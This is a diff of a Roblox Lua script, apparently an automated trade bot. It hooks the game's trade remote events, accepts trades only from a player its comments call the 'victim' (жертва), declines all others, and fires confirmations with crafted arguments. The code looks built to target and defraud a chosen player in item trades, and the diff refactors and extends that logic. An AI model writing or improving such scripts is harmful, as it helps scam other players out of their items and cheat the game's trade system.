@@ -517,40 +517,48 @@ task.spawn(function()
     end
 end)
 
-local Trade = ReplicatedStorage:WaitForChild("Trade",100)
-Trade.SendRequest.OnClientInvoke = function(...)
-    local args = {...}
-    local sender = args[1] or "none"
-    if targetName == sender then
-        Trade.AcceptRequest:FireServer()
-        print("sendrequest sus")
-    else
+local Trade = ReplicatedStorage:WaitForChild("Trade", 100)
+
+Trade.SendRequest.OnClientInvoke = function(arg1)
+    if not arg1 then
         Trade.DeclineRequest:FireServer()
-        print("не жертва кинула запрос на трейд")
+        return false
     end
-    return true
+
+    local senderName = type(arg1) == "userdata" and arg1.Name or tostring(arg1)
+    print("SendRequest от:", senderName)
+
+    if targetName == senderName then
+        print("✅ жертва кинула запрос")
+        Trade.AcceptRequest:FireServer()
+        return true
+    else
+        print("❌ не жертва:", senderName)
+        Trade.DeclineRequest:FireServer()
+        return false
+    end
 end
 
-Trade.StartTrade.OnClientEvent:Connect(function(...)
-    local args = {...}
-    local name = args[2] or "none"
+Trade.StartTrade.OnClientEvent:Connect(function(arg1, arg2)
+    local name = tostring(arg2 or "")
+    print("StartTrade, игрок:", name)
+
     if targetName == name then
-        print("start trade sus")
+        print("✅ жертва в StartTrade")
     else
+        print("❌ не жертва в StartTrade:", name)
         Trade.DeclineTrade:FireServer()
-        print("не жертва в starttrade")
     end
 end)
-Trade.AcceptTrade.OnClientEvent:Connect(function(...)
-    print("accept trade sus")
-    local args = {...}
-    local ended = args[1] or false
-    if not ended then
-        Trade.AcceptTrade:FireServer(game.PlaceId*3,lastOfferTime)
-        wait(0.2)
+
+Trade.AcceptTrade.OnClientEvent:Connect(function(arg1, arg2)
+    print("AcceptTrade, ended:", tostring(arg1))
+    if not arg1 then
+        Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferTime)
+        task.wait(0.2)
     end
 end)
 
 Trade.EndTrade.OnClientEvent:Connect(function()
-    warn("отклонение трейда в окне трейд")
+    warn("отклонение трейда в окне трейда")
 end)
